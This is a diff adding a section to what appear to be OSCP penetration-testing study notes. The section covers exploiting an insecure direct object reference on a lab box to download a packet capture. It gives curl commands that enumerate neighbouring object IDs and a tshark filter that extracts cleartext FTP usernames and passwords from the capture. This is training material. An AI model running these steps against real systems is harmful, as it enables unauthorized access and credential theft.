@@ -330,6 +330,30 @@ Piece by piece:
 
 See [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]], [[OSCP/MODULES/08. Introduction to Web Application Attacks|Module 8 - Web Application Attacks]], [[OSCP/MODULES/09. Common Web Application Attacks|Module 9 - Common Web Application Attacks]], and [[OSCP/DECISION TREE/Web Applications (Decision Tree)|Web Applications Decision Tree]].
 
+## Dashboard IDOR to PCAP credential recovery
+
+The important command boundary is evidence preservation. The headers prove the response status and content type, the separate output files let you compare adjacent objects without losing the bodies, and capinfos/tshark identify whether the downloaded artifact contains a useful cleartext protocol.
+
+~~~bash
+curl -sS -D "$BoxDir/loot/data-0.headers" -o "$BoxDir/loot/data-0.html" \
+  "http://$BoxIP/data/0"
+curl -sS -D "$BoxDir/loot/data-1.headers" -o "$BoxDir/loot/data-1.html" \
+  "http://$BoxIP/data/1"
+wc -c "$BoxDir/loot/data-0.html" "$BoxDir/loot/data-1.html"
+curl -sS -D "$BoxDir/loot/download-0.headers" \
+  -o "$BoxDir/loot/capture-0.pcap" "http://$BoxIP/download/0"
+capinfos "$BoxDir/loot/capture-0.pcap"
+tshark -r "$BoxDir/loot/capture-0.pcap" \
+  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
+  -T fields -e ftp.request.command -e ftp.request.arg \
+  > "$BoxDir/loot/capture-0.ftp-auth.raw"
+chmod 600 "$BoxDir/loot/capture-0.ftp-auth.raw"
+~~~
+
+Do not treat equal HTTP status codes as equal authorization. An empty object and another user's object may both be 200; compare size and content. Keep raw authentication output out of shared logs. See [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] and [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]].
+
+#### Tags: #IDOR #PCAP #Tshark #CredentialRecovery #CommandBreakdowns
+
 ## External Resources
 
 - [HackTricks - XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
